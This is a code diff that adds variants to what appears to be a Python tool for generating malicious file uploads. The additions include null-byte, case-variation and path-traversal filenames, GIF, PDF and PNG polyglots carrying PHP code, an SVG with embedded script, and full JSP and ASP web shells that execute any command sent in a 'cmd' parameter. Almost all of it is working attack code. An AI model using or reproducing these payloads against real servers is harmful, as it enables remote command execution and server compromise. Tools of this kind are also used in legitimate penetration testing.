@@ -138,10 +138,95 @@ def _variant_content_type_confusion(payload: str, base_name: str) -> Tuple[str, 
     return filename, "multipart/form-data; boundary=" + boundary, multipart
 
 
+def _variant_null_byte(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    filename = f"{base_name}.php%00.jpg"
+    content = b"\xff\xd8\xff\xe0" + payload.encode()
+    return filename, "image/jpeg", content
+
+
+def _variant_case_variation(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    filename = f"{base_name}.PhP"
+    return filename, "application/x-php", payload.encode()
+
+
+def _variant_path_traversal(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    filename = f"../../../{base_name}.php"
+    return filename, "application/x-php", payload.encode()
+
+
+def _variant_gif_polyglot(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    gif_header = b"GIF89a"
+    php_payload = f"<?php {payload} ?>".encode()
+    combined = gif_header + php_payload
+    filename = f"{base_name}.gif.php"
+    return filename, "image/gif", combined
+
+
+def _variant_pdf_polyglot(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    pdf_header = b"%PDF-1.4"
+    php_payload = f"\n<?php {payload} ?>\n".encode()
+    combined = pdf_header + php_payload
+    filename = f"{base_name}.pdf.php"
+    return filename, "application/pdf", combined
+
+
+def _variant_svg_payload(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    svg_content = f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>{payload}</script></svg>'
+    filename = f"{base_name}.svg"
+    return filename, "image/svg+xml", svg_content.encode()
+
+
+def _variant_jsp_webshell(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    jsp_shell = f'''<%@ page import="java.util.*,java.io.*"%>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null) {{
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while((line = br.readLine()) != null) {{
+        out.println(line);
+    }}
+}}
+%>'''
+    filename = f"{base_name}.jsp"
+    return filename, "application/x-jsp", jsp_shell.encode()
+
+
+def _variant_asp_webshell(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    asp_shell = f'''<%
+Dim cmd
+cmd = Request("cmd")
+Set shell = CreateObject("WScript.Shell")
+Set exec = shell.Exec(cmd)
+Response.Write(exec.StdOut.ReadAll)
+%>'''
+    filename = f"{base_name}.asp"
+    return filename, "application/x-asp", asp_shell.encode()
+
+
+def _variant_magic_bytes_php(payload: str, base_name: str) -> Tuple[str, str, bytes]:
+    # PNG magic bytes followed by PHP code
+    png_header = bytes.fromhex("89504E470D0A1A0A")
+    php_code = f"<?php {payload} ?>".encode()
+    combined = png_header + php_code
+    filename = f"{base_name}.png"
+    return filename, "image/png", combined
+
+
 VARIANTS: Dict[str, Callable[[str, str], Tuple[str, str, bytes]]] = {
     "polyglot_png_php": _variant_polyglot_png,
     "polyglot_zip_php": _variant_polyglot_zip,
     "double_extension": _variant_double_extension,
     "htaccess": _variant_htaccess_shell,
     "multipart_confusion": _variant_content_type_confusion,
+    "null_byte": _variant_null_byte,
+    "case_variation": _variant_case_variation,
+    "path_traversal": _variant_path_traversal,
+    "gif_polyglot": _variant_gif_polyglot,
+    "pdf_polyglot": _variant_pdf_polyglot,
+    "svg_payload": _variant_svg_payload,
+    "jsp_webshell": _variant_jsp_webshell,
+    "asp_webshell": _variant_asp_webshell,
+    "magic_bytes_php": _variant_magic_bytes_php,
 }
